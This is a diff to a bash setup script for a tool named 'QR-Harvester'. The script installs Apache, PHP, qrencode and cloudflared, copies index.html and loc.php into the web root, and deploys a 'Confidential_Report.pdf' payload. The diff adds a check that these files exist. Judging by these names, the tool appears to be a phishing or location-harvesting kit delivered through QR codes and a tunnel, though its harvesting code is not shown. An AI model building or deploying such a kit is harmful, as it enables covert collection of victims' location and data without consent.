@@ -1,14 +1,3 @@
-
-chmod +x setup.sh
-./setup.sh
-
-
-sudo chown -R www-data:www-data /var/www/html/
-sudo chmod -R 755 /var/www/html/
-
-
-
-
 #!/bin/bash
 
 echo "[*] Starting QR-Harvester Setup..."
@@ -21,9 +10,14 @@ sudo apt install apache2 php php-curl qrencode cloudflared -y
 sudo chown -R www-data:www-data /var/www/html/
 sudo chmod -R 755 /var/www/html/
 
-# Copy web files
-sudo cp web/index.html /var/www/html/
-sudo cp web/loc.php /var/www/html/
+# Copy web files if they exist in a 'web' folder
+if [ -f "web/index.html" ]; then
+    sudo cp web/index.html /var/www/html/
+    sudo cp web/loc.php /var/www/html/
+    echo "[*] Web files copied from 'web' folder."
+else
+    echo "[!] Warning: web/index.html not found. Make sure you are in the project root."
+fi
 
 # Copy PDF payload if it exists
 if [ -f "payloads/Confidential_Report.pdf" ]; then
